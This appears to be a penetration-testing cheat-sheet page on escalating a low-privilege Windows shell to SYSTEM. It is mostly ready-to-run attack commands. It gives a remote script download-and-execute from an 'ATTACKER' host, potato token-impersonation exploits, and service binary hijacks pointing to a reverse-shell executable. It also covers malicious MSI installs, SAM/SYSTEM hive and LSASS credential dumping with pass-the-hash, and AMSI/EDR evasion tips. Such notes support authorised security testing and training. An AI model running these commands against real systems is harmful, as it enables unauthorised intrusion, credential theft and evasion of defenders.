---
tags:
  - Privesc
  - Windows
---

# :material-microsoft-windows: Windows Privilege Escalation

<span class="pill pill-medium">post-ex</span> <span class="pill pill-info">windows</span>

Turn a low-priv Windows shell into `NT AUTHORITY\SYSTEM`. Vectors cluster around **service misconfigurations, token privileges, registry settings, and harvested credentials**.

!!! abstract "TL;DR"
    Run `winPEAS`, check `whoami /priv` (impersonation privileges → potato), audit services (unquoted paths, weak perms), hunt stored creds, and cross-reference binaries against [LOLBAS](https://lolbas-project.github.io/).

## :material-clipboard-list: Enumerate first

```powershell
whoami /all                      # groups + PRIVILEGES (key!)
systeminfo                       # OS/patch level for kernel exploits
.\winPEASx64.exe                 # the workhorse
# PowerShell alternatives:
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks
IEX(...) Seatbelt.exe -group=all
```

## :material-key-star: Token privileges → SYSTEM

<span class="pill pill-easy">check whoami /priv first</span>

If `whoami /priv` shows any of these **enabled**, you likely win instantly:

| Privilege | Exploit |
| --- | --- |
| `SeImpersonatePrivilege` | **Potato** family (very common on service accounts) |
| `SeAssignPrimaryToken` | Potato |
| `SeBackupPrivilege` | Read SAM/SYSTEM hives, `SAM` → hashes |
| `SeRestorePrivilege` | Overwrite protected files / registry |
| `SeDebugPrivilege` | Dump LSASS, migrate into SYSTEM proc |
| `SeTakeOwnership` | Own & rewrite a privileged binary |

```powershell
# SeImpersonate -> SYSTEM (pick the potato that matches the OS)
.\PrintSpoofer64.exe -i -c cmd
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\JuicyPotatoNG.exe -t * -p cmd.exe
```

!!! loot "Service accounts almost always have SeImpersonate"
    Web/DB/service contexts (IIS `iis apppool`, MSSQL) run with `SeImpersonatePrivilege` — a potato takes them straight to SYSTEM. This is the #1 Windows privesc after landing via a web RCE.

## :material-cog: Service misconfigurations

=== "Unquoted service path"

    ```powershell
    # Find them
    wmic service get name,pathname,startmode | findstr /i /v "c:\windows\\" | findstr /i /v """
    ```
    `C:\Program Files\My App\svc.exe` unquoted → Windows tries `C:\Program.exe`, then `C:\Program Files\My.exe`… Drop your binary in a writable earlier path.

=== "Weak service permissions"

    ```powershell
    # PowerUp finds services you can reconfigure
    Get-ModifiableService              # from PowerUp
    sc config vulnsvc binPath= "C:\temp\rev.exe"
    net stop vulnsvc & net start vulnsvc
    ```

=== "Writable service binary"

    You can overwrite the EXE the service runs → replace with your payload, restart.

## :material-registry: Registry & install vectors

- **AlwaysInstallElevated** (both HKLM+HKCU = 1) → any MSI runs as SYSTEM:
  ```powershell
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  msiexec /quiet /qn /i evil.msi          # build with msfvenom -f msi
  ```
- **Autorun / startup** binaries you can overwrite.
- **Weak registry ACLs** on service keys (`Get-ACL`).

## :material-key-variant: Credential hunting

!!! loot "Where creds hide on Windows"
    ```powershell
    # Unattended install / sysprep leftovers
    type C:\Windows\Panther\Unattend.xml
    findstr /si password *.xml *.ini *.txt *.config 2>nul
    # Saved creds & vaults
    cmdkey /list ;  runas /savecred /user:admin cmd
    reg query HKLM /f password /t REG_SZ /s
    # WiFi, PowerShell history, browser data
    (Get-PSReadlineOption).HistorySavePath
    # SAM/LSASS (with rights)
    reg save HKLM\SAM sam; reg save HKLM\SYSTEM sys    # then secretsdump.py -sam sam -system sys LOCAL
    ```
    LSASS dump → `pypykatz`/`mimikatz` → plaintext creds, NTLM hashes, Kerberos tickets → pass-the-hash into [Active Directory](../network/active-directory.md).

## :material-alert: Kernel & patch-level exploits

Match `systeminfo` against missing patches (`wesng`, Watson):

- **PrintNightmare** (CVE-2021-34527), **HiveNightmare/SeriousSAM** (CVE-2021-36934 — readable SAM), **CVE-2020-0787 (BITS)**, **CVE-2016-0099 (Secondary Logon)**.

!!! opsec "EDR watches these closely"
    LSASS access, potato exploits, and known-exploit binaries are heavily signatured. Obfuscate/AMSI-bypass as your ROE allows, and prefer living-off-the-land ([LOLBAS](https://lolbas-project.github.io/)) where possible.

## :material-alert-decagram: Edge cases & gotchas

!!! bug "Which potato — and when none of them work"
    `SeImpersonate`/`SeAssignPrimaryToken` is the trigger, but the *right* potato
    depends on the host:

    - **PrintSpoofer / GodPotato** — most reliable on modern Server 2019/2022 &
      Win10/11. Try these first.
    - **JuicyPotato** — dead on Server 2019+ (the DCOM OXID trick was patched); only
      use on 2016/older.
    - **RoguePotato / JuicyPotatoNG** — need a redirector on port 135 or specific
      CLSIDs; fiddly.
    - **No `SeImpersonate`?** You're likely a *normal* user, not a service — pivot to
      service/registry/creds vectors instead.

=== "Your shell isn't what you think"

    - **UAC / medium integrity:** a local-admin shell can still be *medium
      integrity* — `whoami /groups` shows `Mandatory Label\Medium`. You must
      **bypass UAC** to use admin rights (`fodhelper`, `computerdefaults`, or run a
      SYSTEM technique). Check with `whoami /priv` (privileges are stripped at
      medium).
    - **32-bit shell on 64-bit Windows:** you get redirected to
      `C:\Windows\SysWOW64` and miss files/tools. Use
      `C:\Windows\Sysnative\...` to reach the real 64-bit binaries, or get a 64-bit
      payload.
    - **PowerShell Constrained Language Mode / AMSI** blocks scripts — check
      `$ExecutionContext.SessionState.LanguageMode`; drop to `cmd`, use LOLBAS, or
      AMSI-bypass per ROE.

=== "Enumeration nuances"

    - **`wesng`/Watson need an accurate `systeminfo`** — hotfix list is often blank
      on cloud images; don't trust "no patches → kernel exploit" blindly.
    - **`AlwaysInstallElevated` needs BOTH** `HKLM` *and* `HKCU` set to 1 — one alone
      does nothing.
    - **Unquoted service path only helps if you can write** to one of the truncated
      dirs *and* restart the service (need `SERVICE_STOP`/`START` or a reboot).
    - **`SeBackupPrivilege`** doesn't give a shell — it lets you *read* `SAM`+`SYSTEM`
      (`reg save`, or `robocopy /b`) → `secretsdump` offline. Different loot, same win.

!!! tip "Line-ending & transfer gotchas"
    PowerShell scripts and `.bat` files uploaded from Linux may carry `\n` line
    endings that break parsing — transfer as-is over SMB/`certutil`, or run inline
    with `IEX`. When copy-pasting into a raw shell, long base64 blobs can get
    mangled; host the file and `DownloadString` instead.

## :material-link-variant: Related

- Arrived via MSSQL `xp_cmdshell` ([SQLi](../web/sqli.md)) or a web shell.
- Harvested hashes/tickets → [SMB](../network/smb.md), [Kerberos](../network/kerberos.md), [Active Directory](../network/active-directory.md).
- Keep it → [Persistence](persistence.md); tunnel out → [Pivoting](pivoting.md).
- Reference: [LOLBAS](https://lolbas-project.github.io/), [HackTricks Windows privesc](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html).
